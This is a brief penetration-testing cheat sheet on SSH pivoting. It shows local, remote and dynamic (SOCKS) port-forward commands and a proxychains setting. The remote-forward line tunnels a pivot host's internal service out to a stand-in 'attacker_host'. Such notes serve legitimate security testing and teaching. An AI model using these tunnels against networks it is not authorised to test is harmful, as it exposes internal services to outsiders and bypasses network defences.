# SSH Pivoting

## Local Port Forward

ssh -L 8080:10.0.0.5:80 user@pivot_host
Access internal host: http://127.0.0.1:8080

Remote Port Forward

ssh -R 8080:127.0.0.1:80 user@attacker_host
Attacker can access pivot’s internal service.

Dynamic Port Forward (SOCKS)

ssh -D 1080 user@pivot_host
Set proxychains.conf to socks5 127.0.0.1 1080.
